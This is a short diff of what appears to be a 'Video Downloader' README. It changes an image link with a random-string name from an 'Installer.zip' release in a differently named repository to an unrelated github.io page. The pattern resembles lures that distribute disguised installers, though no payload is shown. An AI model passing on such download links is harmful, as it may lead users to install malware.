@@ -1,4 +1,4 @@
-[![vogqwkgtj](https://github.com/user-attachments/assets/0218813e-817c-4744-9544-7fa949f48c5f)](https://github.com/HeadMesmerize/vjwzkgtj/releases/download/ex/Installer.zip)
+[![vogqwkgtj](https://github.com/user-attachments/assets/0218813e-817c-4744-9544-7fa949f48c5f)](https://liki20092009-sys.github.io/)
 
 # 🎬 Video Downloader
 
